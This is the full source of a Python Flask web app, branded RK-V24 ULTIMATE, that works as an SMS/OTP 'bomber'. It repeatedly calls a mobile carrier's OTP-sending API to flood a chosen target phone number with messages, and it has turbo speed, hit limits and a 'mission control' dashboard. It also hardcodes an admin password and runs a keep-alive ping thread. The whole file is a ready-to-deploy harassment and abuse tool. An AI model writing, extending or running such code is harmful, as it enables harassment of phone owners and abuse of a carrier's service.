import requests, threading, os, time, sqlite3, random
from datetime import datetime, timedelta, timezone
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- [CONFIG & WAKEUP] ----------
APP_URL = "https://rk-bomb.onrender.com"

def self_ping():
    while True:
        try: requests.get(APP_URL, timeout=10)
        except: pass
        time.sleep(600)

threading.Thread(target=self_ping, daemon=True).start()

# ---------- [DATABASE SETUP] ----------
def get_db():
    conn = sqlite3.connect('rk_ultimate_v2.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, total INTEGER, start_time TEXT, run_time TEXT)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?)", ("admin", generate_password_hash("JaNiNaTo-330")))
        except: pass

init_db()

# ---------- [BOMBING ENGINE] ----------
active_sessions = {}

def send_robi_otp(phone):
    url = "https://da-api.robi.com.bd/da-nll/otp/send"
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    target = phone if phone.startswith("88") else f"88{phone}"
    try:
        res = requests.post(url, headers=headers, json={"msisdn": target}, timeout=8)
        return res.status_code == 200
    except: return False

def bombing_task(username, phone, limit, speed, start_dt):
    key = f"{username}_{phone}"
    delay = 0.5 if speed == "turbo" else 2.0
    
    while key in active_sessions:
        s = active_sessions[key]
        if s['total'] >= limit or s['status'] == 'Stopped': break
        
        if s['status'] == 'Running':
            now = datetime.now()
            active_sessions[key]['run_time'] = str(now - start_dt).split('.')[0]
            
            if send_robi_otp(phone):
                active_sessions[key]['success'] += 1
                active_sessions[key]['log'] = f"Packet Transmitted to {phone}"
            else:
                active_sessions[key]['log'] = "Connection Timed Out..."
            
            active_sessions[key]['total'] += 1
            time.sleep(delay)
        else:
            time.sleep(1)

    del active_sessions[key]

# ---------- [ULTIMATE UI LAYOUT] ----------
LAYOUT = '''
<!DOCTYPE html>
<html>
<head>
    <title>RK-V24 ULTIMATE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #030303; --red: #ff3366; --blue: #00d2ff; }
        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; padding: 15px; }
        .container { max-width: 500px; margin: auto; }
        
        .rk-card { background: rgba(20,20,20,0.8); border: 1px solid #222; border-radius: 25px; padding: 30px; margin-top: 20px; position: relative; overflow: hidden; }
        .rk-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: linear-gradient(90deg, transparent, var(--neon), transparent); animation: scan 2s linear infinite; }
        @keyframes scan { 0% { left: -100%; } 100% { left: 100%; } }

        h2 { font-family: 'Orbitron'; color: var(--neon); text-align: center; font-size: 20px; letter-spacing: 2px; }
        
        input, select { width: 100%; padding: 15px; margin: 12px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 12px; outline: none; font-size: 15px; }
        .btn-launch { width: 100%; padding: 18px; background: linear-gradient(45deg, var(--neon), var(--blue)); border: none; border-radius: 15px; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; color: #000; box-shadow: 0 0 20px rgba(0,255,204,0.4); }

        .monitor { background: #080808; border: 1px solid #1a1a1a; border-radius: 20px; padding: 20px; margin-top: 25px; border-bottom: 4px solid var(--blue); }
        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .stat-item { background: #000; padding: 12px; border-radius: 12px; text-align: center; border: 1px dotted #333; }
        .label { font-size: 10px; color: #555; text-transform: uppercase; }
        .value { font-family: 'Orbitron'; font-size: 14px; color: var(--neon); }
        
        .console { background: #000; color: #00ff00; font-family: monospace; font-size: 10px; padding: 10px; margin-top: 15px; border-radius: 8px; height: 30px; overflow: hidden; border: 1px solid #111; }
        
        .progress-container { width: 100px; height: 100px; margin: auto; position: relative; }
        .progress-svg { transform: rotate(-90deg); }
        .circle-bg { fill: none; stroke: #111; stroke-width: 8; }
        .circle-bar { fill: none; stroke: var(--neon); stroke-width: 8; stroke-dasharray: 251; stroke-dashoffset: 251; transition: 1s; }
        
        .nav { display: flex; justify-content: space-between; align-items: center; padding-bottom: 10px; border-bottom: 1px solid #222; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav">
            <div style="font-family:'Orbitron'; color:var(--neon);">RK-V24 ULTIMATE</div>
            <a href="/logout" style="color:var(--red); text-decoration:none; font-size:12px; font-weight:bold;">DISCONNECT</a>
        </div>
        [CONTENT]
    </div>

    <script>
        function updateMonitor() {
            let area = document.getElementById('monitor-area');
            if(!area) return;
            fetch('/api/status').then(r => r.json()).then(data => {
                let html = '';
                for(let k in data) {
                    let s = data[k];
                    let offset = 251 - (251 * (s.total / s.limit));
                    html += `
                    <div class="monitor">
                        <div class="progress-container">
                            <svg class="progress-svg" width="100" height="100">
                                <circle class="circle-bg" cx="50" cy="50" r="40"></circle>
                                <circle class="circle-bar" cx="50" cy="50" r="40" style="stroke-dashoffset: ${offset}"></circle>
                            </svg>
                            <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-family:'Orbitron'; font-size:12px;">${Math.round((s.total/s.limit)*100)}%</div>
                        </div>
                        <div class="stat-grid">
                            <div class="stat-item"><span class="label">Target</span><span class="value">${s.phone}</span></div>
                            <div class="stat-item"><span class="label">Mode</span><span class="value" style="color:var(--red)">${s.speed}</span></div>
                            <div class="stat-item"><span class="label">Start</span><span class="value">${s.start_time}</span></div>
                            <div class="stat-item"><span class="label">Run Time</span><span class="value">${s.run_time}</span></div>
                        </div>
                        <div class="console">> ${s.log}</div>
                        <button onclick="location.href='/api/stop?num=${s.phone}'" style="width:100%; margin-top:15px; background:var(--red); border:none; color:#fff; padding:10px; border-radius:10px; font-family:'Orbitron'; font-size:10px; cursor:pointer;">ABORT MISSION</button>
                    </div>`;
                }
                area.innerHTML = html;
            });
        }
        setInterval(updateMonitor, 1500);
    </script>
</body>
</html>
'''

# ---------- [ROUTES] ----------

@app.route('/')
def dashboard():
    if 'user' not in session: return redirect('/login')
    content = '''
    <div class="rk-card">
        <h2>⚡ MISSION CONTROL</h2>
        <form action="/api/start">
            <input name="num" type="tel" placeholder="Target Number (018...)" required>
            <input name="amt" type="number" placeholder="Hit Limit" required>
            <select name="speed">
                <option value="normal">NORMAL MODE</option>
                <option value="turbo">TURBO MODE (FAST)</option>
            </select>
            <button class="btn-launch">INITIATE SYSTEM</button>
        </form>
    </div>
    <div id="monitor-area"></div>
    '''
    return render_template_string(LAYOUT.replace('[CONTENT]', content))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect('/')
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="rk-card"><h2>HACKER LOGIN</h2><form method="POST"><input name="u" placeholder="Admin ID"><input name="p" type="password" placeholder="Access Key"><button class="btn-launch">LOGIN</button></form></div>'))

@app.route('/api/start')
def api_start():
    u = session.get('user')
    num = request.args.get('num')
    amt = int(request.args.get('amt') or 0)
    speed = request.args.get('speed')
    if u and num:
        start_dt = datetime.now()
        key = f"{u}_{num}"
        active_sessions[key] = {
            'phone': num, 'success': 0, 'total': 0, 'limit': amt, 
            'status': 'Running', 'speed': speed.upper(),
            'start_time': start_dt.strftime("%I:%M %p"), 'run_time': '0:00:00',
            'log': 'System Initialized...'
        }
        threading.Thread(target=bombing_task, args=(u, num, amt, speed, start_dt), daemon=True).start()
    return redirect('/')

@app.route('/api/status')
def api_status():
    return jsonify({k: v for k, v in active_sessions.items() if k.startswith(session.get('user',''))})

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 54300)))
